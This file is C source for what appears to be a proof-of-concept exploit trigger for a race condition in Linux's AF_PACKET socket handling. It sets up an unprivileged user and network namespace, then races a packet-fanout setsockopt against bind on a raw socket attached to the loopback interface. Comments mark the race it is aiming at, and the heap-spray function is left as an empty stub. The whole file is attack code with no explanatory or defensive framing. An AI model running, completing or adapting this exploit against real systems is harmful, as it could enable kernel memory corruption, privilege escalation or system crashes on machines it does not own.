//#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/if_ether.h> 
#include <net/if.h>
#include <pthread.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sched.h>
#define RACE_TIME 1
#define CLONE_NEWUSER       0x10000000  /* New user namespace */
#define CLONE_NEWNET        0x40000000  /* New network namespace */
#define ETH_P_ARP   0x0806      /* Address Resolution packet    */

struct detect_profile{
    unsigned long* ptr;
    int profile_type;
};


#define IS_ERR(c, s) { if (c) perror(s); }

struct sockaddr_ll {
    unsigned short  sll_family;
    short   sll_protocol; // big endian
    int sll_ifindex;
    unsigned short  sll_hatype;
    unsigned char   sll_pkttype;
    unsigned char   sll_halen;
    unsigned char   sll_addr[8];
};

static int fd;
static struct ifreq ifr;
static struct sockaddr_ll addr;

void *task1(void *unused)
{
    int fanout_val = 0x3;

    // need race: check on po->running
    // also must be 1st or link wont register
    int err = setsockopt(fd, 0x107, 18, &fanout_val, sizeof(fanout_val));
    // IS_ERR(err == -1, "setsockopt");
}

void *task2(void *unused)
{
    int pid;
    int err = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
}

void spray(void *unused){
    return;
}
void loop_race()
{
    int err, index;
    int i=0;

    while(i<RACE_TIME) {


        fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        IS_ERR(fd == -1, "socket");

        strcpy((char *)&ifr.ifr_name, "lo");
        err = ioctl(fd, SIOCGIFINDEX, &ifr);
        IS_ERR(err == -1, "ioctl SIOCGIFINDEX");
        index = ifr.ifr_ifindex;

        err = ioctl(fd, SIOCGIFFLAGS, &ifr);
        IS_ERR(err == -1, "ioctl SIOCGIFFLAGS");

        ifr.ifr_flags &= ~(short)IFF_UP;
        err = ioctl(fd, SIOCSIFFLAGS, &ifr);
        IS_ERR(err == -1, "ioctl SIOCSIFFLAGS");

        addr.sll_family = AF_PACKET;
        addr.sll_protocol = 0x0; // need something different to rehook && 0 to skip register_prot_hook
        addr.sll_ifindex = index;

        pthread_t thread1, thread2;
            pthread_create (&thread1, NULL, task1, NULL);
            pthread_create (&thread2, NULL, task2, NULL);

            pthread_join(thread1, NULL);
            pthread_join(thread2, NULL);

        close(fd);
        usleep(1);

        i++;
    }
}

static bool write_file1(const char* file, const char* what, ...) {
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);

    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        close(fd);
        return false;
    }
    close(fd);
    return true;
}

void setup_sandbox() {
    int real_uid = getuid();
    int real_gid = getgid();

    if (unshare(CLONE_NEWUSER) != 0) {
        printf("[!] unprivileged user namespaces are not available\n");
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }
    if (unshare(CLONE_NEWNET) != 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    if (!write_file1("/proc/self/setgroups", "deny")) {
        perror("[-] write_file1(/proc/self/set_groups)");
        exit(EXIT_FAILURE);
    }
    if (!write_file1("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
        perror("[-] write_file1(/proc/self/uid_map)");
        exit(EXIT_FAILURE);
    }
    if (!write_file1("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        perror("[-] write_file1(/proc/self/gid_map)");
        exit(EXIT_FAILURE);
    }
}

int main_15649()
{
    setup_sandbox();
    //system("id; capsh --print");
    loop_race();
    return 0;
}
